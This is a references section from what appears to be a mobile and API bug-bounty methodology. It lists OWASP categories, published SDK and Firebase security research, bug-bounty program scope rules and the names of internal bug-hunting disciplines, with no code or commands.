- **OWASP Mobile Top 10 2024** — M2, M6 Inadequate Privacy Controls, M8, M9 (whose example list names "misconfiguring cloud storage permissions"); **OWASP API Security Top 10 2023** — API1, API2, API5, API8, API10.
- **Third-party research and program rules** — Oversecured's SDK-security research and its seven SDK vulnerability classes; the EngageLab EngageSDK case (≤ v4.5.4, fixed 5.2.1 on 2025-11-03); CVE-2020-8913 (Play Core); Cobalt's "Mobile Vulnerabilities: Pen tester's guide" AWS-key example; YesWeHack's Android recon guide and its credential-handling boundary; Intigriti's triage standards on out-of-scope testing; Xiaomi's General Assessment Rules and its separate privacy bounty table; Google Mobile VRP's Low-Impact-Data definition; Basecamp's hardcoded-key carve-out; Reddit's Firebase-key exclusion; HackerOne's PII and leaked-credential standards; the Datafarm Flutter secret-hunting write-up; the FCM-takeover research (abss0x7tbh) and the reported $30,000+ aggregate; the Tea App breach (misconfigured Storage bucket, ~72,000 images and ~1.1M private messages) and the 2025 reporting of ~150 unauthenticated Firebase endpoints across top-ranked apps.
- **The bug-hunting corpus (`secondary/claude-bughunter.md`)** — the 60-pattern secret grep and its "validate before claiming" rule; the shadow-API version-diff method; Marker Discipline, the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the Shell-Loop Ban; the layer-ordering trap; the pre-severity gate run against the Critical claim; the five-screenshot state-change pattern and the PII mask/leave-visible split; retraction discipline and its patched-mid-engagement inverse; primitives-first chain filing and the never-submit list.
- **Local senior-researcher corpus** — the restriction-verification discipline ("verify Google/Firebase API-key restriction precisely", the three distinct responses), the living-report ruled-out register as a deliverable, the evidence tree layout, and the graveyard of classes that reliably do not pay.
